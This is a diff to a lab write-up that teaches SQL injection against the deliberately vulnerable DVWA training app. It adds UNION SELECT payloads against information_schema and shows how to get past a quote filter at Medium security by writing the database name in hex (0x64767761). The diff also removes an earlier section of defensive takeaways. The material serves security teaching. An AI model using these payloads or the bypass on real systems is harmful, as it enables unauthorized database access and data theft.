@@ -1240,12 +1240,137 @@ FROM information_schema.tables
 The application successfully returns database tables again.
 
 
+{{ SQL Injection in DVWA – Medium Security Bypass Using HEX }} 
 
- Key Takeaway
+Previously, we successfully extracted all tables from the database.
+Now we want to filter the results and display only the tables that belong to the `dvwa` database.
 
- Low security allows direct SQL Injection
- Medium security blocks quotes but is still vulnerable
- Attackers can bypass weak filtering using alternative payloads
- `UNION SELECT` allows attackers to extract sensitive database information
- Always use parameterized queries / prepared statements to prevent SQL Injection
+The normal query is:
 
+```sql id="8c56lc"
+1 UNION SELECT table_name,2
+FROM information_schema.tables
+WHERE table_schema='dvwa'
+```
+
+But at Medium Security, DVWA blocks quotation marks (`'`), so this payload fails.
+
+
+
+---
+
+ Why It Fails
+
+The application filters special characters like:
+
+```text id="93zvfk"
+'
+"
+```
+
+Even URL encoding the quote:
+
+```text id="glx20p"
+%27
+```
+
+still gets blocked.
+
+So we need another way to write:
+
+```text id="bd6vl8"
+dvwa
+```
+
+without using quotes.
+
+---
+
+ Using Burp Suite Decoder
+
+To bypass this restriction, we can convert the database name into HEX format using Burp Suite Decoder.
+
+Open:
+
+```text id="84zh44"
+Burp Suite → Decoder
+```
+
+Type:
+
+```text id="9hduw6"
+dvwa
+```
+
+Then choose:
+
+```text id="jq7q40"
+Encode as → Hex
+```
+
+The HEX value becomes:
+
+```text id="xumhzq"
+64767761
+```
+
+
+---
+
+ Using HEX in SQL Injection
+
+In MySQL, HEX values start with:
+
+```text id="0esvxb"
+0x
+```
+
+So instead of:
+
+```sql id="tdx8n4"
+'dvwa'
+```
+
+we use:
+
+```sql id="xyk2w6"
+0x64767761
+```
+
+Now the payload becomes:
+
+```sql id="m24f8u"
+1 UNION SELECT table_name,2
+FROM information_schema.tables
+WHERE table_schema=0x64767761
+```
+
+Notice:
+
+ No quotes are used
+ The database name is written in HEX
+ This bypasses the filter
+
+<img width="1440" height="650" alt="Screenshot 2026-05-26 at 11 33 27 AM" src="https://github.com/user-attachments/assets/44f6ef96-bb0b-451b-a466-f4a6f69789f2" />
+
+
+
+ Result
+
+The application now returns only tables from the DVWA database, such as:
+
+ guestbook
+ users
+
+This confirms the SQL Injection still works at Medium Security.
+
+
+ Important Concept
+
+When quotes are blocked:
+
+ Convert text into HEX
+ Use `0x` before the HEX value
+ Avoid using quotes completely
+
+This technique is commonly used to bypass weak SQL Injection filters.
